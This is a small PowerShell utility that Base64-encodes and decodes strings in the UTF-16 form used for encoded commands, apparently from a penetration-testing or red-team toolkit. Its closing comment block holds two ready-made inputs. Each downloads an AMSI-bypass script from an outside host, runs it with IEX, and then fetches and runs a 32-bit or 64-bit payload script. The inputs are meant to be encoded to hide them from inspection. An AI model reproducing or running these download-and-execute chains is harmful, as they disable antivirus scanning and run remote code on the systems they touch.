[cmdletbinding()]
param(
    [string]$Encode,
    [string]$Decode
)

if ($Encode.Length -gt 0) {
    [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($Encode))
} elseif ($Decode.Length -gt 0) {
    [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($Decode))
}

<#
$Encode = "(New-Object System.Net.WebClient).DownloadString('http://192.168.199.101/amsibypass.ps1') | IEX; (New-Object System.Net.WebClient).DownloadString('http://192.168.199.101/runme32.ps1') | IEX"
$Encode = "(New-Object System.Net.WebClient).DownloadString('http://192.168.199.101/amsibypass.ps1') | IEX; (New-Object System.Net.WebClient).DownloadString('http://192.168.199.101/runme64.ps1') | IEX"
#>